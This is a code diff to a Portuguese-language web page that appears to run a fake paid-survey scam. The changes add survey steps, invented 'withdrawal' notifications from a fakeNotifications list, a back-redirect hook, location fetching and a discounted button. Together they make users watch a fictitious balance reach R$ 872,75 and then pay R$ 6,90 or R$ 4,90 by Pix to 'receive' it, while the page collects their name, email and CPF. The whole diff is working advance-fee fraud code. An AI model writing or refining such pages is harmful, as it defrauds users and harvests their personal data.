+      btnPay.textContent = "PAGAR R$ 4,90 (COM DESCONTO) E RECEBER R$ 1.022,75";
+      btnPay.setAttribute('onclick', 'finishOrder(4.90)');
+    }
 
     function initSocialProof() {
       setInterval(() => {
         const rand = fakeNotifications[Math.floor(Math.random() * fakeNotifications.length)];
         showToast(rand.name, rand.text);
-      }, 10000);
+      }, 7000);
     }
 
     window.addEventListener('DOMContentLoaded', () => {
-      setTimeout(initSocialProof, 2000);
+      fetchUserLocation();
+      setupBackRedirect();
+      setTimeout(initSocialProof, 1500);
     });
 
     function showToast(title, desc) {
-      document.getElementById('toast-title').textContent = title;
-      document.getElementById('toast-desc').textContent = desc;
+      document.getElementById('toast-title').textContent = "Saque Realizado!";
+      document.getElementById('toast-desc').textContent = `${title} ${desc}`;
       const container = document.getElementById('toast-container');
       container.classList.remove('opacity-0', 'pointer-events-none');
       container.classList.add('opacity-100', 'toast-anim');
       setTimeout(() => {
         container.classList.remove('opacity-100', 'toast-anim');
         container.classList.add('opacity-0', 'pointer-events-none');
-      }, 4000);
+      }, 4500);
     }
 
     function switchStep(stepNumber) {
@@ -299,10 +468,10 @@
       currentStep = stepNumber;
       window.scrollTo({ top: 0, behavior: 'smooth' });
 
-      if (stepNumber === 5) {
+      if (stepNumber === 7) {
         startVideoPlayer();
       } else {
-        stopVideoPlayer(); // PAUSA E REMOVE O VÍDEO PARA CORTAR O ÁUDIO
+        stopVideoPlayer();
       }
     }
 
@@ -311,7 +480,6 @@
         alert("É necessário ter mais de 18 anos para participar.");
         return;
       }
-      showToast("Sucesso", "Maioridade confirmada com sucesso.");
       switchStep(2);
     }
 
@@ -319,11 +487,29 @@
       const parentId = 'options-q' + questionNum;
       document.querySelectorAll(`#${parentId} button`).forEach(b => {
         b.classList.remove('border-pink-500', 'bg-pink-50/50');
-        b.querySelector('div').classList.remove('border-pink-500', 'bg-pink-500');
+        const radioInner = b.querySelector('.w-5 .rounded-full');
+        if (radioInner) {
+          radioInner.classList.remove('bg-pink-500');
+          radioInner.classList.add('bg-transparent');
+        }
+        const radioOuter = b.querySelector('.w-5');
+        if (radioOuter) {
+          radioOuter.classList.remove('border-pink-500');
+          radioOuter.classList.add('border-slate-300');
+        }
       });
 
       btnElement.classList.add('border-pink-500', 'bg-pink-50/50');
-      btnElement.querySelector('div').classList.add('border-pink-500', 'bg-pink-500');
+      const radioOuter = btnElement.querySelector('.w-5');
+      if (radioOuter) {
+        radioOuter.classList.remove('border-slate-300');
+        radioOuter.classList.add('border-pink-500');
+      }
+      const radioInner = btnElement.querySelector('.w-5 .rounded-full');
+      if (radioInner) {
+        radioInner.classList.remove('bg-transparent');
+        radioInner.classList.add('bg-pink-500');
+      }
 
       const btnNext = document.getElementById('btn-q' + questionNum);
       btnNext.disabled = false;
@@ -332,17 +518,18 @@
     }
 
     function nextStep(targetStep) {
-      if (targetStep === 3) userBalance += 250.00;
-      else if (targetStep === 4) userBalance += 315.50;
+      if (targetStep === 3) userBalance += 180.00;
+      else if (targetStep === 4) userBalance += 195.50;
+      else if (targetStep === 5) userBalance += 165.25;
+      else if (targetStep === 6) userBalance += 172.00;
       updateBalanceDisplay();
       switchStep(targetStep);
     }
 
     function finishResearch() {
-      userBalance += 307.25;
+      userBalance += 160.00; // Soma exata R$ 872,75
       updateBalanceDisplay();
-      showToast("Pesquisas Concluídas!", "Saldo total de R$ 872,75 pronto para saque!");
-      switchStep(5);
+      switchStep(7);
     }
 
     function updateBalanceDisplay() {
@@ -360,7 +547,7 @@
 
     function stopVideoPlayer() {
       const container = document.getElementById('video-container');
-      container.innerHTML = ''; // Remove o iframe cortando o som
+      container.innerHTML = '';
       if (videoTimer) {
         clearInterval(videoTimer);
         videoTimer = null;
@@ -390,18 +577,16 @@
           btnDone.classList.remove('bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
           btnDone.classList.add('bg-pink-600', 'hover:bg-pink-700', 'text-white', 'cursor-pointer', 'shadow-md', 'shadow-pink-200');
           btnDone.textContent = "Solicitar Saque do Saldo";
-          showToast("Vídeo Validado!", "Agora você já pode receber o Pix.");
         }
       }, 1000);
     }
 
     function proceedToPayScreen() {
       stopVideoPlayer();
-      switchStep(6);
+      switchStep(8);
     }
 
-    // VALIDAÇÃO E CHAMADA DA API NA VERCEL
-    async function finishOrder() {
+    async function finishOrder(customAmount = 6.90) {
       const name = document.getElementById('pay-name').value.trim();
       const email = document.getElementById('pay-email').value.trim();
       const cpfInput = document.getElementById('pay-cpf').value.trim();
@@ -413,7 +598,6 @@
         return;
       }
 
-      // Validação estrita dos 11 dígitos do CPF
       if (cleanCpf.length !== 11) {
         alert("CPF inválido! Por favor digite exatamente os 11 números do seu CPF.");
         document.getElementById('pay-cpf').focus();
@@ -422,33 +606,31 @@
 
       const btnPay = document.getElementById('btn-pay-action');
       btnPay.disabled = true;
-      btnPay.innerText = "Gerando Pix na Vercel...";
+      btnPay.innerText = "Gerando Pix...";
 
-      switchStep(7);
-      showToast("Conectando...", "Gerando cobrança via SyncPay...");
+      switchStep(9);
 
       try {
         const response = await fetch('/api/gerar-pix', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ name, email, cpf: cleanCpf })
+          body: JSON.stringify({ name, email, cpf: cleanCpf, amount: customAmount })
         });
 
         const data = await response.json();
 
         if (data.pix_code) {
           document.getElementById('pix-code-text').value = data.pix_code;
-          showToast("Sucesso!", "Pix oficial gerado!");
         } else {
           throw new Error(data.error || "Não foi possível retornar o código Pix.");
         }
       } catch (err) {
         console.error("Erro:", err);
         alert("Ocorreu um erro ao gerar o Pix. Verifique os dados informados.");
-        switchStep(6);
+        switchStep(8);
       } finally {
         btnPay.disabled = false;
-        btnPay.innerText = "PAGAR R$ 6,90 E RECEBER R$ 872,75";
+        btnPay.innerText = `PAGAR R$ ${customAmount.toFixed(2).replace('.', ',')} E RECEBER R$ 872,75`;
       }
     }
 
@@ -466,8 +648,6 @@
       btn.innerHTML = "<span>✓ CÓDIGO COPIADO COM SUCESSO!</span>";
       btn.classList.remove('bg-slate-900', 'hover:bg-slate-800');
       btn.classList.add('bg-emerald-600');
-      
-      showToast("Copiado!", "Código Pix copiado para a área de transferência.");
 
       setTimeout(() => {
         btn.innerHTML = "<span>📋 Copiar Código Pix</span>";
